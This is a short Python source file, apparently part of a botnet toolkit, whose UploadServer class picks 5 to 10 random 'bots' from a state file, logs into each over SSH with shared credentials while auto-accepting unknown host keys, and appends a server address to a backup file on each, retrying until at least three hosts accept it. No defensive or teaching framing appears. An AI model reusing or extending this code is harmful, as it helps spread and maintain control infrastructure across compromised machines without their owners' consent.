#!/usr/bin/python3

import random

import paramiko

from BotsState import BotsState


class UploadServer:
    def __init__(self, server, config):
        self.server = server
        self.config = config
        self.upload()

    def upload(self):
        b = self.random_bots()
        self.send(b)

    def random_bots(self):
        b = BotsState(self.config["bot_file"], self.config["ssh_port"], self.config["threads"]).status()
        c = random.sample(b, random.randint(5, 10))
        return c

    def send(self, bots):
        installed = [self.install(bot) for bot in bots]
        if sum(installed) < 3:
            print("[*] Server was installed in %d servers, retrying..." % sum(installed))
            self.upload()

    def install(self, bot):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(bot, port=self.config["ssh_port"], username=self.config["ssh_user"],
                        password=self.config["ssh_pass"], timeout=10)
            ssh.exec_command("echo '%s' >> %s" % (self.server, self.config["backup"]), timeout=10)
            ssh.close()
            return True
        except:
            return False
